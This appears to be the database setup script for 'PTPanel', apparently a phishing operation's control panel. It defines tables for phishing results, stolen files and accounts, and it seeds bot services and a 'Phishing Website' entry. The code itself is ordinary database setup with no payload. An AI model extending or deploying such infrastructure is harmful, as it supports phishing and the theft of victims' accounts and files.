#!/usr/bin/env python3
"""
PTPanel Database Initialization Script
"""
import sys
import os
import logging

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.database import db_manager
from models.db_models import Admin, Account, PhishingResult, StolenFile, Service, SystemLog
from core.security import hash_password
from config import config

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_default_admin():
    """Create default admin user"""
    session = db_manager.get_session()
    try:
        admin = session.query(Admin).filter(Admin.username == config.admin.username).first()
        if not admin:
            admin = Admin(
                username=config.admin.username,
                password_hash=hash_password(config.admin.password),
                is_active=True
            )
            session.add(admin)
            session.commit()
            logger.info(f"✅ Default admin user created: {config.admin.username}")
            return True
        else:
            logger.info("ℹ️  Admin user already exists")
            return True
    except Exception as e:
        logger.error(f"❌ Failed to create admin user: {e}")
        session.rollback()
        return False
    finally:
        session.close()

def create_default_services():
    """Create default service entries"""
    session = db_manager.get_session()
    try:
        services = [
            Service(name="WebApp Bot", service_type="bot", status="stopped"),
            Service(name="Classic Bot", service_type="bot", status="stopped"),
            Service(name="Multitool Bot", service_type="bot", status="stopped"),
            Service(name="Admin Bot", service_type="bot", status="stopped"),
            Service(name="Phishing Website", service_type="website", status="stopped"),
        ]
        
        for service_data in services:
            service = session.query(Service).filter(Service.name == service_data.name).first()
            if not service:
                session.add(service_data)
        
        session.commit()
        logger.info("✅ Default services created")
    except Exception as e:
        logger.error(f"❌ Failed to create services: {e}")
        session.rollback()
    finally:
        session.close()

def main():
    """Initialize database with default data"""
    try:
        logger.info("🔄 Initializing PTPanel database...")
        
        # Create tables
        db_manager.create_tables()
        logger.info("✅ Database tables created successfully")
        
        # Create default admin
        if not create_default_admin():
            sys.exit(1)
        
        # Create default services
        create_default_services()
        
        logger.info("🎉 PTPanel database initialization completed successfully")
        
    except Exception as e:
        logger.error(f"❌ Database initialization failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()